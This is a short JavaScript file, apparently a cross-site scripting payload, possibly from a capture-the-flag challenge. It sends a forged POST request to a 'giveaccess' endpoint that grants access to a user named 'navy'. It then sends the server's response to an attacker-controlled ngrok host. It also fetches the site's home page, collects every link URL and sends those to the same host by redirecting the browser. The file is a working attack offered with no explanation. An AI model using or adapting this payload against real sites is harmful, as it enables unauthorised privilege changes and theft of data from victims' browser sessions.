//document.location = 'https://f15d-103-93-37-18.ngrok.io/index.html?worrkkkkk'
var http = new XMLHttpRequest();
var url = 'giveaccess';
var params = 'id=b5260abfbbec4fe18980bfa5e8386d38&user=navy&access=Give+Access';
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() { //Call a function when the state changes.
    if (http.readyState == 4 && http.status == 200) {
        document.location = 'http://f15d-103-93-37-18.ngrok.io?' + http.responseText
    }
}
http.send(params);

fetch('/').then(res => res.text().then(data => {
    var el = document.createElement('html');
    el.innerHTML = data;
    l = el.getElementsByTagName('a');
    str = ''
    for (let i = 0; i < l.length; i++) {
        str = str + l[i].href
    }
    document.location = 'http://f15d-103-93-37-18.ngrok.io?' + encodeURI(str)
}))